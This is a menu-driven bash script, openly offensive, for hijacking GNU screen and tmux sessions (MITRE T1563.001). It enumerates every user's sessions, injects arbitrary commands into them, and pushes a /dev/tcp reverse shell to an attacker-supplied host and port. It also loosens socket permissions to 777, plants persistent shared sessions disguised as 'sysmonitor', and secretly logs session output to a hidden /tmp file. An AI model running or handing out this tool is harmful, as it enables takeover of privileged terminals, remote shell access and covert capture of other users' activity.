#!/bin/bash
# Screen/Tmux Session Hijack (T1563.001)
# Detect, attach to, and inject commands into privileged terminal multiplexer sessions

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
MARKER="d3m0n_screenhijack"

banner() {
    echo -e "${RED}"
    echo " ╔══════════════════════════════════════════════════════╗"
    echo " ║    Screen/Tmux Session Hijack (T1563.001)            ║"
    echo " ║  Attach to privileged sessions, inject commands      ║"
    echo " ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

list_screen_sessions() {
    echo -e "${YELLOW}[*] Active screen sessions:${NC}"
    if command -v screen >/dev/null 2>&1; then
        # List all screen sockets in /run/screen
        find /run/screen /var/run/screen /tmp/.screen-* 2>/dev/null -name "*.sock" -o \
            -type d -name "S-*" 2>/dev/null | while read -r s; do
            echo "  $s"
        done
        # Also list via screen -ls from each user
        find /run/screen /var/run/screen 2>/dev/null -type d -name "S-*" | while read -r d; do
            local USER; USER=$(basename "$d" | sed 's/S-//')
            echo -e "  ${GREEN}User ${USER}:${NC}"
            ls "$d" 2>/dev/null | while read -r sess; do
                echo "    → ${sess}"
            done
        done
    else
        echo -e "${YELLOW}  screen not installed${NC}"
    fi
}

list_tmux_sessions() {
    echo -e "${YELLOW}[*] Active tmux sessions:${NC}"
    if command -v tmux >/dev/null 2>&1; then
        # Find all tmux sockets
        find /tmp -name ".tmux-*" -type d 2>/dev/null | while read -r d; do
            local UID_NUM; UID_NUM=$(basename "$d" | sed 's/.tmux-//')
            local USER; USER=$(getent passwd "$UID_NUM" 2>/dev/null | cut -d: -f1)
            echo -e "  ${GREEN}User ${USER:-uid:$UID_NUM}:${NC}"
            ls "$d" 2>/dev/null | while read -r sock; do
                echo "    → ${d}/${sock}"
                TMUX="" tmux -S "${d}/${sock}" list-sessions 2>/dev/null | while read -r sess; do
                    echo "      ${sess}"
                done
            done
        done
    else
        echo -e "${YELLOW}  tmux not installed${NC}"
    fi
}

inject_screen() {
    local SOCK="$1" CMD="$2"
    # screen -x attaches in multi-display mode without stealing the session
    # Use -S to specify socket, -X to send command without interactive attach
    if screen -S "$SOCK" -X stuff "${CMD}
" 2>/dev/null; then
        echo -e "${GREEN}[+] Command injected into screen session: ${SOCK}${NC}"
    else
        echo -e "${RED}[-] Failed to inject (permission denied or session gone)${NC}"
        echo -e "${YELLOW}[!] Try: screen -r ${SOCK} to attach first${NC}"
    fi
}

inject_tmux() {
    local SOCK="$1" SESSION="${2:-0}" CMD="$3"
    if TMUX="" tmux -S "$SOCK" send-keys -t "$SESSION" "$CMD" Enter 2>/dev/null; then
        echo -e "${GREEN}[+] Command injected into tmux: ${SOCK}:${SESSION}${NC}"
    else
        echo -e "${RED}[-] Failed (permission denied or session not found)${NC}"
    fi
}

steal_screen() {
    # Change permissions on screen socket to allow our user to attach
    local SOCK_DIR="$1"
    echo -e "${YELLOW}[!] Attempting to widen socket permissions...${NC}"
    chmod 777 "$SOCK_DIR" 2>/dev/null && echo -e "${GREEN}[+] Socket dir permissions changed${NC}"
}

steal_tmux() {
    local SOCK="$1"
    chmod 777 "$SOCK" 2>/dev/null && echo -e "${GREEN}[+] Tmux socket permissions changed${NC}"
}

create_shared_screen() {
    # Create a persistent shared screen session that root can attach to
    local SESSION_NAME="${1:-sysmonitor}"
    screen -dmS "$SESSION_NAME" -m bash 2>/dev/null
    screen -S "$SESSION_NAME" -X multiuser on 2>/dev/null
    screen -S "$SESSION_NAME" -X acladd root 2>/dev/null
    echo -e "${GREEN}[+] Shared screen session: ${SESSION_NAME}${NC}"
    echo -e "${YELLOW}[!] Attach: screen -x ${SESSION_NAME}${NC}"
}

create_shared_tmux() {
    # Create a persistent tmux session with a known socket
    local SOCK="/tmp/.${MARKER}.sock"
    local SESSION_NAME="${1:-sysmonitor}"
    TMUX="" tmux -S "$SOCK" new-session -d -s "$SESSION_NAME" 2>/dev/null
    chmod 700 "$SOCK" 2>/dev/null
    echo -e "${GREEN}[+] Shared tmux session: ${SESSION_NAME}${NC}"
    echo -e "${GREEN}[+] Socket: ${SOCK}${NC}"
    echo -e "${YELLOW}[!] Attach: tmux -S ${SOCK} attach${NC}"
}

screen_logger() {
    # Install screen logger: capture all screen output
    local LOGFILE="/tmp/.${MARKER}.log"
    local TARGET_SOCK="$1"
    screen -S "$TARGET_SOCK" -X log on 2>/dev/null
    screen -S "$TARGET_SOCK" -X logfile "$LOGFILE" 2>/dev/null
    echo -e "${GREEN}[+] Screen logging enabled → ${LOGFILE}${NC}"
}

revshell_via_session() {
    local SESSION_TYPE="$1" SOCK="$2" SESSION_ID="${3:-0}" LHOST="$4" LPORT="$5"
    local CMD="bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &"
    if [ "$SESSION_TYPE" = "tmux" ]; then
        inject_tmux "$SOCK" "$SESSION_ID" "$CMD"
    else
        inject_screen "$SOCK" "$CMD"
    fi
}

banner

echo -e "  ${YELLOW}[1]${NC} List all screen sessions"
echo -e "  ${YELLOW}[2]${NC} List all tmux sessions"
echo -e "  ${YELLOW}[3]${NC} Inject command into screen session"
echo -e "  ${YELLOW}[4]${NC} Inject command into tmux session"
echo -e "  ${YELLOW}[5]${NC} Inject reverse shell into screen session"
echo -e "  ${YELLOW}[6]${NC} Inject reverse shell into tmux session"
echo -e "  ${YELLOW}[7]${NC} Widen screen socket permissions"
echo -e "  ${YELLOW}[8]${NC} Widen tmux socket permissions"
echo -e "  ${YELLOW}[9]${NC} Create persistent shared screen session"
echo -e "  ${YELLOW}[10]${NC} Create persistent shared tmux session"
echo ""
read -rp "Choice: " OPT

case "$OPT" in
    1) list_screen_sessions ;;
    2) list_tmux_sessions ;;
    3)
        list_screen_sessions
        read -rp "Session name/socket: " SOCK
        read -rp "Command to inject: " CMD
        inject_screen "$SOCK" "$CMD"
        ;;
    4)
        list_tmux_sessions
        read -rp "Tmux socket path: " SOCK
        read -rp "Session [0]: " SESS; SESS="${SESS:-0}"
        read -rp "Command: " CMD
        inject_tmux "$SOCK" "$SESS" "$CMD"
        ;;
    5)
        list_screen_sessions
        read -rp "Session name/socket: " SOCK
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        revshell_via_session "screen" "$SOCK" "0" "$LHOST" "$LPORT"
        ;;
    6)
        list_tmux_sessions
        read -rp "Tmux socket path: " SOCK
        read -rp "Session [0]: " SESS; SESS="${SESS:-0}"
        read -rp "LHOST: " LHOST; read -rp "LPORT: " LPORT
        revshell_via_session "tmux" "$SOCK" "$SESS" "$LHOST" "$LPORT"
        ;;
    7)
        list_screen_sessions
        read -rp "Socket dir path: " SOCKD
        steal_screen "$SOCKD"
        ;;
    8)
        list_tmux_sessions
        read -rp "Tmux socket path: " SOCK
        steal_tmux "$SOCK"
        ;;
    9)
        read -rp "Session name [sysmonitor]: " NAME; NAME="${NAME:-sysmonitor}"
        create_shared_screen "$NAME"
        ;;
    10)
        read -rp "Session name [sysmonitor]: " NAME; NAME="${NAME:-sysmonitor}"
        create_shared_tmux "$NAME"
        ;;
    *) echo -e "${RED}[-] Invalid option${NC}" ;;
esac
